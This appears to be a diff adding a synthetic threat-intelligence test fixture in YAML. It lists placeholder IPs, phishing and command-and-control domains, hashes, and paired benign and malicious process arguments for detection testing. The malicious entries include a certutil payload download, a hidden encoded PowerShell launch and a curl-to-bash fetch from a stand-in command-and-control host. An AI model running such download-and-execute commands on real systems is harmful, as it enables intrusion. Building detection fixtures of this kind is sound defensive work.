@@ -1,0 +1,54 @@
+version: 1
+externalIps:
+  poolA:
+    - "198.51.100.24"
+    - "198.51.100.45"
+    - "198.51.100.89"
+    - "198.51.100.112"
+  poolB:
+    - "203.0.113.15"
+    - "203.0.113.78"
+    - "203.0.113.92"
+    - "203.0.113.144"
+  poolC:
+    - "192.0.2.33"
+    - "192.0.2.67"
+    - "192.0.2.140"
+    - "192.0.2.205"
+
+phishingDomains:
+  - "portal.invoice-secure.example"
+  - "auth-verify.payroll-system.test"
+  - "login-reset.corporate-portal.example"
+  - "secure-update.identity-sso.test"
+  - "verify.sharepoint-docs.example"
+
+c2Domains:
+  - "cdn-static.telemetry-api.example"
+  - "update-service.cloud-sync.test"
+  - "analytics-beacon.fast-edge.example"
+  - "status-check.host-monitor.test"
+
+fileHashes:
+  # Synthetic 64-char sha256 strings (generated from test tokens)
+  maliciousPayloader:
+    - "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+    - "c0535e4be2b79ffd93291305436bf889314e4a3faec05ecffcbb7ff3109190e6"
+    - "a591a6d40bf420404a011733cfb7b190d62c65bf0bcda32b57b277d9ad9f146e"
+  benignAdminTools:
+    - "4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a"
+    - "ef2d127de37b942baad06145e54b0c619a1f22327b2ebbcfbec78f5564afe39d"
+
+suspiciousProcesses:
+  - name: "certutil.exe"
+    path: "C:\\Windows\\System32\\certutil.exe"
+    maliciousArgs: "-urlcache -split -f https://{c2Domain}/stage2.bin C:\\Users\\Public\\update.bin"
+    benignArgs: "-verify -urlcache http://pki.corp.internal/crl/root.crl"
+  - name: "powershell.exe"
+    path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+    maliciousArgs: "-NoP -NonI -W Hidden -Exec Bypass -Enc VABlAHMAdABQAGEAeQBsAG8AYQBkAA=="
+    benignArgs: "-ExecutionPolicy Bypass -File C:\\ITAdmin\\Scripts\\Collect-DiagnosticLogs.ps1"
+  - name: "curl"
+    path: "/usr/bin/curl"
+    maliciousArgs: "-fsSL https://{c2Domain}/shell.sh | bash"
+    benignArgs: "-fsSL https://apt.corp.internal/repo-key.gpg | gpg --dearmor"
